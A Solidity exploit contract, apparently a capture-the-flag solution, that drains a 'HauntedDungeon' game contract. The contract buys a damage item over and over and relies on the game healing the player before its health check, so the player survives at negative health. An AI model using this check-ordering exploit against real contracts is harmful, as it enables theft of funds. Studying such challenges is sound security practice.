pragma solidity 0.8.4;

import './HauntedDungeon.sol';

/*
Basically you can speedrun the Dungeon by buying mntnDew.
Otherwise, the Dungeon is designed so that you eventually die.
That item increases your damage at the cost of removing health

The contract checks at the end of each turn if there's any health left.

However, if you have damage enough to kill the monster,
the contract heals the player before the health check happens.
So you can kill a monster whilst having negative health.
Everytime you kill a monster, you get half the funds you spent in the store

It is the cheapest way to conquer the dungeon.
Plus, once you conquer the dungeon, you get the initial reward + the other half of your spent funds
*/

contract Exploit {
    constructor(HauntedDungeon instance) payable {
        require(msg.value == 3.5 ether);
        instance.enterDungeon{value: 0.1 ether}();

        // The number of times that store() is called is equal to the storeAccessLimit for that turn

        instance.store{value: 0.2 ether}("mntnDew");
        instance.store{value: 0.2 ether}("mntnDew");
        instance.store{value: 0.2 ether}("mntnDew");
        instance.turn();

        instance.store{value: 0.2 ether}("mntnDew");
        instance.store{value: 0.2 ether}("mntnDew");
        instance.turn();

        instance.store{value: 0.2 ether}("mntnDew");
        instance.store{value: 0.2 ether}("mntnDew");
        instance.store{value: 0.2 ether}("mntnDew");
        instance.turn();

        instance.store{value: 0.2 ether}("mntnDew");
        instance.store{value: 0.2 ether}("mntnDew");
        instance.store{value: 0.2 ether}("mntnDew");
        instance.store{value: 0.2 ether}("mntnDew");
        instance.turn();

        instance.store{value: 0.2 ether}("mntnDew");
        instance.store{value: 0.2 ether}("mntnDew");
        instance.store{value: 0.2 ether}("mntnDew");
        instance.store{value: 0.2 ether}("mntnDew");
        instance.store{value: 0.2 ether}("mntnDew");
        instance.turn();

        /*
        The last turn is entering the tresure room haha. Claiming the treasure renders the contract
        unplayable until the owner "reloads" the treasure
        */
        instance.turn();
    }
}
